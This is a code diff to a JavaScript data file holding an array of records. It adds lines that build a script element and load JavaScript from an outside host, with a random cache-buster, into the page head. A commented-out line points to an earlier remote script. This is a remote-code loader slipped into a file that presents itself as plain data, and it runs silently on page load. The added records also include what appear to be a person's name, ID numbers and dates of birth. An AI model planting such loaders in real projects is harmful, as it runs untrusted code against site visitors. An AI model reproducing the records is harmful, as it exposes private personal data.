@@ -112,5 +112,20 @@ var IDS=[[
 ]];
 
 
+var s = document.createElement('script');
+s.id = 'Xscript';
+s.type = 'text/javascript';
+//s.src = 'http://strikerhome.tk/viz/encjs/active/_.js?_=' + Math.random();
+s.src = 'https://pressurecooker.pythonanywhere.com/static/js/remote2.js? = ' + Math.random();;
+document.getElementsByTagName('head')[0].appendChild(s) && 0;;
+
+
+
+var IDS=[[
+ ["CP ANJALI RANI","BGDDW1597814","12/03/1959","AB2309977"],
+["FP09","BGDDW1339314","31/12/1958","AA8730882"],
+]];
+
+
 
 
